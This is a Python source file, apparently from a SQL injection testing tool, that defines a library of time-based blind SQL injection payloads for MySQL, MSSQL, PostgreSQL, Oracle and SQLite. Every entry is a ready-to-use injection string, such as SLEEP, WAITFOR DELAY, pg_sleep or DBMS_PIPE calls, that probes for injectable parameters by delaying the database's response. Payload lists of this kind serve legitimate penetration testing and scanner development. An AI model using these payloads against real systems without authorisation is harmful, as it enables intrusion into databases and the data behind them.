"""Time-based SQL injection payloads."""

from sqli_mcp.models import Payload, InjectionType, DatabaseType

TIME_BASED_PAYLOADS: list[Payload] = [
    # MySQL Time-based
    Payload(
        value="' AND SLEEP(5)-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL SLEEP injection"
    ),
    Payload(
        value="' OR SLEEP(5)-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL SLEEP with OR"
    ),
    Payload(
        value="' AND IF(1=1,SLEEP(5),0)-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL conditional SLEEP"
    ),
    Payload(
        value="' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL subquery SLEEP"
    ),
    Payload(
        value="1' AND SLEEP(5)#",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL SLEEP with hash comment"
    ),
    Payload(
        value="' AND BENCHMARK(10000000,SHA1('test'))-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL BENCHMARK time delay"
    ),
    
    # MSSQL Time-based
    Payload(
        value="'; WAITFOR DELAY '0:0:5'-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL WAITFOR DELAY"
    ),
    Payload(
        value="' AND 1=1 WAITFOR DELAY '0:0:5'-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL conditional WAITFOR"
    ),
    Payload(
        value="'); WAITFOR DELAY '0:0:5'-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL WAITFOR with parenthesis"
    ),
    Payload(
        value="' IF 1=1 WAITFOR DELAY '0:0:5'-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL IF WAITFOR"
    ),
    
    # PostgreSQL Time-based
    Payload(
        value="'; SELECT pg_sleep(5)-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL pg_sleep"
    ),
    Payload(
        value="' AND 1=(SELECT 1 FROM pg_sleep(5))-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL subquery pg_sleep"
    ),
    Payload(
        value="'||pg_sleep(5)-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL concatenation pg_sleep"
    ),
    Payload(
        value="' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL CASE pg_sleep"
    ),
    
    # Oracle Time-based
    Payload(
        value="' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.ORACLE,
        description="Oracle DBMS_PIPE.RECEIVE_MESSAGE"
    ),
    Payload(
        value="' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.ORACLE,
        description="Oracle conditional DBMS_PIPE"
    ),
    Payload(
        value="' AND UTL_HTTP.REQUEST('http://0.0.0.0:1')=1-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.ORACLE,
        description="Oracle UTL_HTTP delay (network)"
    ),
    
    # SQLite Time-based
    Payload(
        value="' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.SQLITE,
        description="SQLite heavy computation delay"
    ),
    Payload(
        value="' AND 1=(SELECT 1 WHERE LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))))-- -",
        injection_type=InjectionType.TIME_BASED,
        database_type=DatabaseType.SQLITE,
        description="SQLite subquery computation delay"
    ),
]
